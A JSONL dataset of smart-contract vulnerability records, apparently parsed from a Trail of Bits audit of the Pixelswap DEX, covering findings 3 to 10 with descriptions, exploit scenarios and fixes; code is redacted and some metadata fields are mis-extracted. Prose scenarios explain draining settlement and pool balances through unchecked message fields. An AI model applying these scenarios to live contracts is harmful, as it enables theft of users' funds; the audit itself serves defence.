"2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Type": "Authentication", "Finding ID": "TOB-PXL-2", "Target": "contracts/pixelswap_funding.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-003", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 3, "page_start": 22, "title": "Users can inflate their funding wallet balance by sending an expired Swap message to the settlement contract", "short_summary": null, "description_md": "#### Description\n\nUsers can inflate their funding wallet balance of any token by sending a Swap message that will trigger a failure reply message from the PixelswapStreamPool contract. Users can use this to drain the settlement contract.\n\nThere are two ways to initiate a swap in the system: sending a PlaceOrder message to the user's funding wallet and sending a Swap message to the PixelswapSettlement contract.\n\nThe Swap message to the PixelswapSettlement contract has an extra\\_tokens field. The token\\_gas and token\\_forward\\_milliton fields of the extra\\_tokens structure are used to calculate the required gas amount and to decide if the output tokens should be added to the user's funding wallet or sent to the user's external wallet. All other fields of the extra\\_tokens values are ignored in the Swap message receiver function of the PixelswapSettlement contract. The Swap receiver of the settlement contract then creates a PlaceOrder message and sends it to the PixelswapStreamPool contract for execution.\n\nIf the place\\_order internal function of the PixelswapStreamPool contract detects a failure case, it sends the PlaceOrder message back to the PixelswapSettlement contract as a failure reply message. The settlement contract then forwards it to the PixelswapFunding contract, which forwards it to the user's PixelswapFundingWallet contract.\n\nThe PixelswapFundingWallet then processes the PlaceOrder message as unspent order, as shown in figure 3.1:\n\n#### **[Redacted]**\n\nHowever, the unspent\\_order\\_inputs function of the PixelswapFundingWallet contract assumes that the tokens included in the extra\\_tokens field were spent from the user's wallet if the token\\_is\\_input is set to true and adds these tokens to the user's balance, while the input tokens in the extra\\_tokens are not spent from the user's funding wallet if they initiate the swap by sending a Swap message to the settlement contract.\n", "full_markdown": "# 3. Users can inflate their funding wallet balance by sending an expired Swap message to the settlement contract\n\n| Severity: High                              | Diffi culty: Low      |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-3 |\n| contracts/pixelswap_streampool.tact Target: |                             |\n\n#### Description\n\nUsers can inflate their funding wallet balance of any token by sending a Swap message that will trigger a failure reply message from the PixelswapStreamPool contract. Users can use this to drain the settlement contract.\n\nThere are two ways to initiate a swap in the system: sending a PlaceOrder message to the user's funding wallet and sending a Swap message to the PixelswapSettlement contract.\n\nThe Swap message to the PixelswapSettlement contract has an extra\\_tokens field. The token\\_gas and token\\_forward\\_milliton fields of the extra\\_tokens structure are used to calculate the required gas amount and to decide if the output tokens should be added to the user's funding wallet or sent to the user's external wallet. All other fields of the extra\\_tokens values are ignored in the Swap message receiver function of the PixelswapSettlement contract. The Swap receiver of the settlement contract then creates a PlaceOrder message and sends it to the PixelswapStreamPool contract for execution.\n\nIf the place\\_order internal function of the PixelswapStreamPool contract detects a failure case, it sends the PlaceOrder message back to the PixelswapSettlement contract as a failure reply message. The settlement contract then forwards it to the PixelswapFunding contract, which forwards it to the user's PixelswapFundingWallet contract.\n\nThe PixelswapFundingWallet then processes the PlaceOrder message as unspent order, as shown in figure 3.1:\n\n#### **[Redacted]**\n\nHowever, the unspent\\_order\\_inputs function of the PixelswapFundingWallet contract assumes that the tokens included in the extra\\_tokens field were spent from the user's wallet if the token\\_is\\_input is set to true and adds these tokens to the user's balance, while the input tokens in the extra\\_tokens are not spent from the user's funding wallet if they initiate the swap by sending a Swap message to the settlement contract.\n\n\n\n#### Exploit Scenario\n\nEve sends an expired Swap message with an extra\\_tokens field containing a TokenInfo for 1,000 USDT tokens with the token\\_is\\_input variable set to true. This message triggers a failure reply message from the PixelswapStreamPool contract, which is forwarded to Eve's funding wallet contract. The funding wallet contract adds 1,000 USDT to her balance, assuming they were spent from her wallet to initiate the swap. Eve withdraws these USDT tokens from her funding wallet and repeats this process to drain all the tokens from the settlement contract.\n\n#### Recommendations\n\nShort term, in the Swap message receiver of the settlement contract, check that the extra\\_tokens field of the message does not include any input tokens.\n\nLong term, document the message flow in both success and failure cases and write test cases to ensure correct behavior in each case.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-3", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-3", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-004", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 4, "page_start": 24, "title": "SettlementVault balances are not updated in the PlaceOrder\\_Partial\\_2 receiver of the settlement contract", "short_summary": null, "description_md": "#### Description\n\nThe PlaceOrder\\_Partial\\_2 message receiver function of the PixelswapSettlement contract is used to relay messages between the funding contract and execution contracts, but it does not update the SettlementVault balances to reflect the transfer of funds between funding and execution contracts.\n\nWhen a user initiates an order from their funding wallet, the PlaceOrder message is sent from their funding wallet to the master funding contract, which sends the same message to the PixelswapSettlement contract. The settlement contract then fetches the execution contract address from its storage and sends the PlaceOrder message to the PixelswapSteampool contract. However, the PlaceOrder\\_Partial\\_2 message receiver of the PixelswapSettlement contract does not remove the input tokens from the SettlementVault of the funding contract and does not add the same tokens to the SettlementVault of the execution contract.\n\nSimilarly, when a failure message is sent from the execution contract to the settlement contract, the PlaceOrder\\_Partial\\_2 message receiver of the PixelswapSettlement contract does not remove the input tokens from SettlementVault of the execution contract and does not add the same tokens to the SettlementVault of the funding contract before sending the message to the funding contract.\n\nThis results in an imbalance between the balances stored in the funding contracts, settlement vaults, and reserves stored in the execution contracts.\n\n#### **[Redacted]**\n", "full_markdown": "# 4. SettlementVault balances are not updated in the PlaceOrder\\_Partial\\_2 receiver of the settlement contract\n\n| Severity: Informational                     | Diffi culty: Low      |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-4 |\n| Target: contracts/pixelswap_settlement.tact |                             |\n\n#### Description\n\nThe PlaceOrder\\_Partial\\_2 message receiver function of the PixelswapSettlement contract is used to relay messages between the funding contract and execution contracts, but it does not update the SettlementVault balances to reflect the transfer of funds between funding and execution contracts.\n\nWhen a user initiates an order from their funding wallet, the PlaceOrder message is sent from their funding wallet to the master funding contract, which sends the same message to the PixelswapSettlement contract. The settlement contract then fetches the execution contract address from its storage and sends the PlaceOrder message to the PixelswapSteampool contract. However, the PlaceOrder\\_Partial\\_2 message receiver of the PixelswapSettlement contract does not remove the input tokens from the SettlementVault of the funding contract and does not add the same tokens to the SettlementVault of the execution contract.\n\nSimilarly, when a failure message is sent from the execution contract to the settlement contract, the PlaceOrder\\_Partial\\_2 message receiver of the PixelswapSettlement contract does not remove the input tokens from SettlementVault of the execution contract and does not add the same tokens to the SettlementVault of the funding contract before sending the message to the funding contract.\n\nThis results in an imbalance between the balances stored in the funding contracts, settlement vaults, and reserves stored in the execution contracts.\n\n#### **[Redacted]**\n\n#### Recommendations\n\nShort term, add calls to the token\\_balance\\_add and token\\_balance\\_reduce internal functions to correctly update the settlement vault balances of the funding and execution contracts while processing the PlaceOrder\\_Partial\\_2 message.\n\nLong term, create message flow and fund flow diagrams, and document all of the places where the balances of different components and users are tracked in the system.\n\n\n\n#### **Fix Review Status**\n", "severity": null, "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-005", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 5, "page_start": 26, "title": "Lack of validation of PixelswapStreamPool configuration parameters", "short_summary": null, "description_md": "#### Description\n\nThe owner of the PixelSwapStreamPool contracts can set the configuration parameters for the pool and the gas to any value without limits. This can lead to broken functionality or high TON spending for users in the pools until the values are fixed.\n\nAccording to the documentation, the owner role belongs to a multisignature wallet, so it is expected that prior to executing a configuration change, more than one actor will review the transaction. Thus, using a multisignature wallet makes it difficult to set wrong configuration values.\n\n#### **[Redacted]**\n", "full_markdown": "# 5. Lack of validation of PixelswapStreamPool configuration parameters\n\n| Severity: Informational                     | Diffi culty: High     |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-5 |\n| Target: contracts/pixelswap_streampool.tact |                             |\n\n#### Description\n\nThe owner of the PixelSwapStreamPool contracts can set the configuration parameters for the pool and the gas to any value without limits. This can lead to broken functionality or high TON spending for users in the pools until the values are fixed.\n\nAccording to the documentation, the owner role belongs to a multisignature wallet, so it is expected that prior to executing a configuration change, more than one actor will review the transaction. Thus, using a multisignature wallet makes it difficult to set wrong configuration values.\n\n#### **[Redacted]**\n\n#### Exploit Scenario\n\nAlice and Bob are signers for the 2-out-of-3 multisignature wallet that controls the deployed PixelswapStreamPool contract. Alice creates and signs a configuration change transaction, accidentally setting the remove\\_liquidity gas configuration to an extremely high value. Bob trusts Alice, so he signs the transaction without reviewing it. When it is executed, users' interactions are more expensive than expected.\n\n#### Recommendations\n\nShort term, set some reasonable limits to the configuration parameters that can be set in the PixelswapStreamPool contract.\n\nLong term, document the expected values for each parameter and their safe ranges. Add test cases for the configuration change functions.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-PXL-5", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-PXL-5", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-006", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 6, "page_start": 27, "title": "Users can drain the TON balance of the PixelswapSettlement contract", "short_summary": null, "description_md": "#### Description\n\nThe gas parameter fields forward\\_milliton and gas\\_transfer of the WithdrawFunds message can be used to drain the TON balance of the PixelswapSettlement contract, as the values specified in these fields are not spent from the user's funding wallet.\n\nThe WithdrawFunds message in the Settlement contract allows users to withdraw the balance of their funding wallet to their external wallet. The WithdrawFunds receiver function of the settlement contract calls the send\\_tokens internal function to transfer the specified token and amount to the user:\n\n#### **[Redacted]**\n\nThe send\\_tokens function transfers the sum of the token\\_amt, forward\\_milliton, and gas\\_transfer values when the provided token\\_id is the TON native currency:\n\n#### **[Redacted]**\n\nHowever, the WithdrawFunds message receiver of the PixelSwapFundingWallet contract does not spend the user's TON balance by the sum of forward\\_milliton and gas\\_transfer values for TON transfer:\n\n#### **[Redacted]**\n\nA user can specify non-zero values for the forward\\_milliton and gas\\_transfer fields in the WithdrawFunds message to drain the TON balance of the settlement contract.\n", "full_markdown": "# 6. Users can drain the TON balance of the PixelswapSettlement contract\n\n| Severity: High                              | Diffi culty: Low      |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-6 |\n| Target: contracts/pixelswap_settlement.tact |                             |\n\n#### Description\n\nThe gas parameter fields forward\\_milliton and gas\\_transfer of the WithdrawFunds message can be used to drain the TON balance of the PixelswapSettlement contract, as the values specified in these fields are not spent from the user's funding wallet.\n\nThe WithdrawFunds message in the Settlement contract allows users to withdraw the balance of their funding wallet to their external wallet. The WithdrawFunds receiver function of the settlement contract calls the send\\_tokens internal function to transfer the specified token and amount to the user:\n\n#### **[Redacted]**\n\nThe send\\_tokens function transfers the sum of the token\\_amt, forward\\_milliton, and gas\\_transfer values when the provided token\\_id is the TON native currency:\n\n#### **[Redacted]**\n\nHowever, the WithdrawFunds message receiver of the PixelSwapFundingWallet contract does not spend the user's TON balance by the sum of forward\\_milliton and gas\\_transfer values for TON transfer:\n\n#### **[Redacted]**\n\nA user can specify non-zero values for the forward\\_milliton and gas\\_transfer fields in the WithdrawFunds message to drain the TON balance of the settlement contract.\n\n#### Exploit Scenario\n\nBob sends 1 nanoton to his funding wallet and creates a message to withdraw all TON balance from the settlement contract.\n\n### Recommendations\n\nShort term, consider one of the following:\n\n\n\n- Ensure that the sum of the token\\_amt, forward\\_milliton, and gas\\_transfer values is deducted from the user's funding wallet while processing the WithdrawFunds message.\n- Or ensure that the forward\\_milliton and gas\\_transfer values are zero when the msg.token\\_id is the TON address.\n- Or update the send\\_tokens to send only token\\_amt TON when transferring the native TON.\n\nLong term, implement tests that verify the total amount of TON balance of the system smart contracts is kept constant after each user action.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-6", "target": {"path": "contracts/pixelswap_settlement.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_settlement.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-6", "Target": "contracts/pixelswap_settlement.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-007", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 7, "page_start": 29, "title": "Users can avoid paying the gas fee for the token creation transaction", "short_summary": null, "description_md": "#### Description\n\nTo create a new token, a user must send a CreateToken message to the Stream Pool contract with enough value to pay for the token creation fee. This fee is also used as a mitigation feature to disincentivize the creation of excessively many tokens, given that the tokens are stored in a mapping structure inside the Stream Pool contract's storage.\n\nIn the CreateToken message handler, the message value is checked to ensure that it is enough to pay the creation fee, but it doesn't take into account the gas costs needed to execute the transaction.\n\nThis allows any user to create new tokens without paying for the computation gas required to create them, using the Stream Pool contract balance to pay for it.\n\n#### **[Redacted]**\n", "full_markdown": "# 7. Users can avoid paying the gas fee for the token creation transaction\n\n| Severity: Low                               | Diffi culty: Low      |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-7 |\n| Target: contracts/pixelswap_streampool.tact |                             |\n\n#### Description\n\nTo create a new token, a user must send a CreateToken message to the Stream Pool contract with enough value to pay for the token creation fee. This fee is also used as a mitigation feature to disincentivize the creation of excessively many tokens, given that the tokens are stored in a mapping structure inside the Stream Pool contract's storage.\n\nIn the CreateToken message handler, the message value is checked to ensure that it is enough to pay the creation fee, but it doesn't take into account the gas costs needed to execute the transaction.\n\nThis allows any user to create new tokens without paying for the computation gas required to create them, using the Stream Pool contract balance to pay for it.\n\n#### **[Redacted]**\n\n#### Exploit Scenario\n\nAlice decides to drain the balance of a PixelswapStreamPool contract. To do this, she starts sending CreateToken messages to the Stream Pool with a value just above (i.e., by 1 nanoton) the token creation fee.\n\nRepeating this will drain the PixelswapStreamPool contract balance, which will be used to pay for all the CreateToken message processing. Admins will need to send TON to it to continue paying the storage fee.\n\n### Recommendations\n\nShort term, modify the value check in the CreateToken message receiver to ensure the user provides enough TON for the required gas.\n\nLong term, expand checks in the test cases to ensure that the TON balance of the system smart contracts does not go down after user actions that do not transfer TON.\n\n#### **Fix Review Status**\n", "severity": "Low", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-7", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-7", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-008", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 8, "page_start": 30, "title": "The tokens\\_count initial value in the PixelswapStreamPool contract is zero", "short_summary": null, "description_md": "#### Description\n\nThe token\\_count variable in the PixelswapStreamPool contract is meant to track how many tokens are added. All stream pool contracts add the TON as a token in the init function, but the tokens\\_count variable is not updated in the init function, and it remains 0.\n\nThis has no impact on the current state of the codebase, as the tokens are stored in a non-iterable mapping.\n", "full_markdown": "### 8. The tokens\\_count initial value in the PixelswapStreamPool contract is zero\n\n| Severity: Informational                     | Diffi culty: Undetermined |\n|------------------------------------------------|---------------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-8     |\n| Target: contracts/pixelswap_streampool.tact |                                 |\n\n#### Description\n\nThe token\\_count variable in the PixelswapStreamPool contract is meant to track how many tokens are added. All stream pool contracts add the TON as a token in the init function, but the tokens\\_count variable is not updated in the init function, and it remains 0.\n\nThis has no impact on the current state of the codebase, as the tokens are stored in a non-iterable mapping.\n\n#### Recommendations\n\nShort term, make sure the tokens\\_count variable is updated in the init function to track the correct number of tokens added to the PixelswapStreamPool contract.\n\nLong term, expand the test suite to implement test cases to check the variable values in all of the contracts. This will ensure correct value updates.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "Undetermined", "type": "Data Validation", "finding_id": "TOB-PXL-8", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Undetermined", "Type": "Data Validation", "Finding ID": "TOB-PXL-8", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-009", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 9, "page_start": 31, "title": "The returned TON amount from an order execution result is ignored", "short_summary": null, "description_md": "#### Description\n\nWhen an order is processed in the PixelswapStreamPool contract, an OrderExecutionResult message is returned to the settlement contract. This message contains information about the amounts of tokens and TON that should be deducted from the settlement vault balance of the exec\\_id and added to the settlement vault balance of the fund\\_id.\n\nThe process\\_order\\_execution\\_result internal function of the settlement contract reduces the token\\_amt of the token\\_id token from the settlement vault balance of the exec\\_id and adds the same balance to the settlement vault of the fund\\_id if the tokens are not transferred to the user's external wallet. However, this function ignores the value of the ton\\_amt field of the OrderExecutionResult message and does not update the settlement vault balance for the native TON token:\n\n#### **[Redacted]**\n\nThe existing execution contract PixelswapStreamPool does not send a non-zero value of the ton\\_amt in the OrderExecutionResult message; therefore, this issue does not lead to any loss of funds in the current system. New execution contracts may send a Jetton and TON together in a single OrderExecutionResult message, which will result in an out-of-sync balance of settlement vaults and other contracts.\n", "full_markdown": "# 9. The returned TON amount from an order execution result is ignored\n\n| Severity: Informational                     | Diffi culty: High     |\n|------------------------------------------------|-----------------------------|\n| Type: Data Validation                    | Finding ID: TOB-PXL-9 |\n| Target: contracts/pixelswap_settlement.tact |                             |\n\n#### Description\n\nWhen an order is processed in the PixelswapStreamPool contract, an OrderExecutionResult message is returned to the settlement contract. This message contains information about the amounts of tokens and TON that should be deducted from the settlement vault balance of the exec\\_id and added to the settlement vault balance of the fund\\_id.\n\nThe process\\_order\\_execution\\_result internal function of the settlement contract reduces the token\\_amt of the token\\_id token from the settlement vault balance of the exec\\_id and adds the same balance to the settlement vault of the fund\\_id if the tokens are not transferred to the user's external wallet. However, this function ignores the value of the ton\\_amt field of the OrderExecutionResult message and does not update the settlement vault balance for the native TON token:\n\n#### **[Redacted]**\n\nThe existing execution contract PixelswapStreamPool does not send a non-zero value of the ton\\_amt in the OrderExecutionResult message; therefore, this issue does not lead to any loss of funds in the current system. New execution contracts may send a Jetton and TON together in a single OrderExecutionResult message, which will result in an out-of-sync balance of settlement vaults and other contracts.\n\n#### Recommendations\n\nShort term, if the ton\\_amt value is non-zero, update the settlement vault balances of the exec\\_id and fund\\_id for the TON token when processing the OrderExecutionResult message.\n\nLong term, create message flow and fund flow diagrams and document all of the places where the balances of different components and users are tracked in the system.\n\n### **Fix Review Status**\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-PXL-9", "target": {"path": "contracts/pixelswap_settlement.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_settlement.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-PXL-9", "Target": "contracts/pixelswap_settlement.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-010", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 10, "page_start": 32, "title": "Wrong formula used for LP amount calculation", "short_summary": null, "description_md": "#### Description\n\nThe PixelswapStreamPool contract uses the wrong formula to compute the LP token amount for adding liquidity. This results in liquidity providers losing on the fee earned from the swaps.\n\nThe PixelswapStreamPool contract calls the calc\\_add\\_lp\\_balanced function of the univ2\\_math.tact library contract to compute the LP token amount to mint for a liquidity provider. The calc\\_add\\_lp\\_balanced function computes the LP token amount by computing the square root of the new reserves and deducting the last total supply of the LP tokens from the result of the square root:\n\n#### **[Redacted]**\n\nHowever, the remove liquidity function computes the amount of tokens to transfer in proportion to the LP tokens to burn with respect to the total supply of the LP tokens. This results in liquidity providers losing their share of the swap fee because the swap fee accrued by the pool up to a certain time is given to the new liquidity providers instead of being distributed among the existing liquidity providers.\n\nThe calc\\_add\\_lp\\_unbalanced function of the univ2\\_math.tact library contract also uses the wrong formula for calculating the LP token amount.\n", "full_markdown": "| 10. Wrong formula used for LP amount calculation |                              |\n|-----------------------------------------------------------------------|------------------------------|\n| Severity: High                                                     | Diffi culty: Low       |\n| Type: Data Validation                                           | Finding ID: TOB-PXL-10 |\n| Target: contracts/univ2_math.tact                                  |                              |\n\n#### Description\n\nThe PixelswapStreamPool contract uses the wrong formula to compute the LP token amount for adding liquidity. This results in liquidity providers losing on the fee earned from the swaps.\n\nThe PixelswapStreamPool contract calls the calc\\_add\\_lp\\_balanced function of the univ2\\_math.tact library contract to compute the LP token amount to mint for a liquidity provider. The calc\\_add\\_lp\\_balanced function computes the LP token amount by computing the square root of the new reserves and deducting the last total supply of the LP tokens from the result of the square root:\n\n#### **[Redacted]**\n\nHowever, the remove liquidity function computes the amount of tokens to transfer in proportion to the LP tokens to burn with respect to the total supply of the LP tokens. This results in liquidity providers losing their share of the swap fee because the swap fee accrued by the pool up to a certain time is given to the new liquidity providers instead of being distributed among the existing liquidity providers.\n\nThe calc\\_add\\_lp\\_unbalanced function of the univ2\\_math.tact library contract also uses the wrong formula for calculating the LP token amount.\n\n### Exploit Scenario\n\nLet us consider a TON / USDC pool with 0 liquidity.\n\n- Alice deposits 10,000,000,000 nanotons TON and 10,000,000,000 nanotons USDC in the pool and mints 10,000,000,000 nanotons LP tokens.\n- Bob swaps 1,000,000,000 nanotons TON for 908,264,387 nanotons USDC. The reserves after the swap are 10,999,970,000 nanotons TON and 9,091,735,613 nanotons USDC.\n- Eve deposits 10,999,970,000 nanotons TON and 9,091,735,613 nanotons USDC, and the protocol mints 10,000,881,879 nanotons LP tokens for Eve.\n\n\n\n● Eve redeems her LP tokens for 11,000,455,010 nanotons TON and 9,092,136,485 nanotons USDC, which is more than the 10,999,484,989 nanotons TON and 9,091,334,740 nanotons USDC that Alice can redeem by removing all her liquidity.\n\n#### Recommendations\n\nShort term, use the following formula for the LP token amount calculation in the calc\\_add\\_lp\\_balanced and calc\\_add\\_lp\\_unbalanced functions when a user adds liquidity to a non-empty pool:\n\n#### **[Redacted]**\n\nLong term, define high-level system invariants and implement end-to-end test cases to check these invariants with multiple transactions by different users. Consider using a fuzzer to test these invariants.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-10", "target": {"path": "contracts/univ2_math.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/univ2_math.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, 